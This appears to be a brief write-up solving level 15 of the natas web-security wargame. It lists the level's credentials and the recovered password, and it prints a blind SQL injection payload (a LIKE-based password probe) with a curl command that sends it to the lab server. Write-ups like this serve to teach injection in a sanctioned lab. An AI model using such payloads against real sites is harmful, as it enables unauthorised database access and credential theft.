# natas level15
natas is CTF with web application.
password will be stored in `/etc/natas_webpass/natas15`.

## using credential is below.
- User:natas15
- Pass:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

## using tools.
- shell(curl, base64, etc)
- lynx

check web site by lynx.
`lynx http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org`

This website has input box for username and search user is exist or not.
And this site has sql injection vulnerability, but retun info only data is exist or not.

I send following and I see that I will get password with many requests.
`natas16" AND password LIKE "%a%"; -- `
`curl -X POST 'http://natas15.natas.labs.overthewire.org/index.php?debug' -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -d 'submit=Check%20existence&username=natas16%22%20AND%20password%20LIKE%20%22%25a%25%22%3b%20%2d%2d%20'`

I make script sqli.rb and got password.
Password:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

